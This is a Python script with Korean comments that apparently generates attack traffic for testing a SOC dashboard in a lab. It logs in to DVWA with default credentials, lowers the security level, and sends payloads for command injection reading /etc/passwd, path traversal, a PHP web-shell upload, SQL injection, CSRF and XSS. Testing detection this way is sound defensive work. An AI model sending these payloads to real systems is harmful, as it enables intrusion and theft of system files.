import requests
import time
import sys

# ==========================================
# 전역 설정
# ==========================================
HEADERS = {"User-Agent": "AI-SOC-Tester"}

# 통신을 유지해줄 세션 객체 생성 (쿠키를 알아서 저장하고 매번 같이 보내줌)
session = requests.Session()

# 전역 변수 (초기에는 비워둠)
BASE_URL = ""


# ==========================================
# 자동 로그인 및 세션 획득 함수
# ==========================================
def auto_login(ip):
    global BASE_URL
    BASE_URL = f"http://{ip}"
    login_url = f"{BASE_URL}/login.php"
    
    login_data = {
        "username": "admin",
        "password": "password",
        "Login": "Login"
    }
    
    print(f"\n[*] {ip} DVWA 서버로 자동 로그인을 시도합니다...")
    try:
        # 세션 객체를 통해 POST 요청
        res = session.post(login_url, data=login_data, headers=HEADERS, timeout=5)
        
        # 로그인 성공 여부 검증
        if "Welcome to Damn Vulnerable Web Application" in res.text:
            print("[+] 로그인 성공! 서버로부터 PHPSESSID를 발급받았습니다.")
            # 보안 레벨 강제 하향 설정
            session.cookies.set("security", "low")
            print("[+] 보안 레벨(security)을 'low'로 세팅 완료했습니다.\n")
            return True
        else:
            print("[-] 로그인 실패. 기본 계정(admin/password)이 맞는지 확인하세요.")
            return False
            
    except requests.exceptions.RequestException as e:
        print(f"[-] 서버 통신 실패 (IP를 다시 확인하세요): {e}")
        return False


# ==========================================
# 1~10번 개별 공격 함수 정의
# (주의: 기존 requests.get()이 아니라 session.get()을 사용해야 쿠키가 유지됨!)
# ==========================================

def attack_1_brute_force():
    print("[1] Brute Force (무차별 대입) 시도 중...")
    url = f"{BASE_URL}/vulnerabilities/brute/"
    params = {"username": "admin", "password": "password", "Login": "Login"}
    try:
        session.get(url, params=params, headers=HEADERS)
        print(" -> 로그인 페이로드 전송 완료")
    except Exception as e: print(f" -> 에러: {e}")

def attack_2_command_injection():
    print("[2] Command Injection (명령어 삽입) 시도 중...")
    url = f"{BASE_URL}/vulnerabilities/exec/"
    data = {"ip": "127.0.0.1; cat /etc/passwd", "Submit": "Submit"}
    try:
        session.post(url, data=data, headers=HEADERS)
        print(" -> 시스템 명령어(cat) 주입 완료")
    except Exception as e: print(f" -> 에러: {e}")

def attack_3_csrf():
    print("[3] CSRF (사이트 간 요청 위조) 시도 중...")
    url = f"{BASE_URL}/vulnerabilities/csrf/"
    params = {"password_new": "hacked", "password_conf": "hacked", "Change": "Change"}
    try:
        session.get(url, params=params, headers=HEADERS)
        print(" -> 비밀번호 강제 변경 페이로드 전송 완료")
    except Exception as e: print(f" -> 에러: {e}")

def attack_4_file_inclusion():
    print("[4] File Inclusion (LFI - 파일 포함) 시도 중...")
    url = f"{BASE_URL}/vulnerabilities/fi/"
    params = {"page": "../../../../etc/passwd"}
    try:
        session.get(url, params=params, headers=HEADERS)
        print(" -> 디렉토리 트래버설 페이로드 전송 완료")
    except Exception as e: print(f" -> 에러: {e}")

def attack_5_file_upload():
    print("[5] File Upload (악성 파일 업로드) 시도 중...")
    url = f"{BASE_URL}/vulnerabilities/upload/"
    files = {'uploaded': ('shell.php', '<?php system($_GET["cmd"]); ?>', 'application/x-php')}
    data = {"Upload": "Upload"}
    try:
        session.post(url, files=files, data=data, headers=HEADERS)
        print(" -> 가짜 웹쉘 파일 업로드 시도 완료")
    except Exception as e: print(f" -> 에러: {e}")

def attack_6_sql_injection():
    print("[6] SQL Injection (SQL 쿼리 삽입) 시도 중...")
    url = f"{BASE_URL}/vulnerabilities/sqli/"
    params = {"id": "' OR '1'='1", "Submit": "Submit"}
    try:
        session.get(url, params=params, headers=HEADERS)
        print(" -> 인증 우회 SQL 페이로드 전송 완료")
    except Exception as e: print(f" -> 에러: {e}")

def attack_7_sql_injection_blind():
    print("[7] SQL Injection Blind (응답 지연 기반) 시도 중...")
    url = f"{BASE_URL}/vulnerabilities/sqli_blind/"
    params = {"id": "1' AND SLEEP(3)#", "Submit": "Submit"}
    try:
        session.get(url, params=params, headers=HEADERS)
        print(" -> SLEEP 함수 주입 완료 (서버 지연 테스트)")
    except Exception as e: print(f" -> 에러: {e}")

def attack_8_xss_reflected():
    print("[8] XSS Reflected (반사형 크로스사이트 스크립팅) 시도 중...")
    url = f"{BASE_URL}/vulnerabilities/xss_r/"
    params = {"name": "<script>alert('Reflected XSS')</script>"}
    try:
        session.get(url, params=params, headers=HEADERS)
        print(" -> 스크립트 태그 전송 완료")
    except Exception as e: print(f" -> 에러: {e}")

def attack_9_xss_stored():
    print("[9] XSS Stored (저장형 크로스사이트 스크립팅) 시도 중...")
    url = f"{BASE_URL}/vulnerabilities/xss_s/"
    data = {
        "txtName": "Hacker",
        "mtxMessage": "<script>alert('Stored XSS')</script>",
        "btnSign": "Sign+Guestbook"
    }
    try:
        session.post(url, data=data, headers=HEADERS)
        print(" -> 게시판에 악성 스크립트 저장 완료")
    except Exception as e: print(f" -> 에러: {e}")

def attack_10_xss_dom():
    print("[10] XSS DOM (DOM 기반 스크립팅) 시도 중...")
    url = f"{BASE_URL}/vulnerabilities/xss_d/"
    params = {"default": "<script>alert('DOM XSS')</script>"}
    try:
        session.get(url, params=params, headers=HEADERS)
        print(" -> DOM 조작 페이로드 전송 완료")
    except Exception as e: print(f" -> 에러: {e}")


# ==========================================
# 실행 제어부
# ==========================================
if __name__ == "__main__":
    print("🚀 SOC 대시보드 테스트용 트래픽 생성 봇 🚀\n")
    
    # 1. 사용자로부터 타겟 IP 입력 받기
    target_ip = input("타겟 서버(Instance B)의 IP를 입력하세요 (예: 192.168.0.100): ")
    
    # 2. 자동 로그인 시도
    if not auto_login(target_ip):
        # 로그인 실패 시 스크립트 종료
        sys.exit()
        
    print("--------------------------------------------------")
    print("공격 시뮬레이션을 시작합니다...\n")
    
    # 3. 원하는 공격 테스트 (주석을 해제하여 사용)
    attack_1_brute_force()
    time.sleep(1)
    
    attack_2_command_injection()
    time.sleep(1)
    
    attack_6_sql_injection()
    time.sleep(1)
    
    attack_9_xss_stored()
    
    print("\n✅ 트래픽 전송 완료! 관제 대시보드(Instance C)를 확인해 보세요.")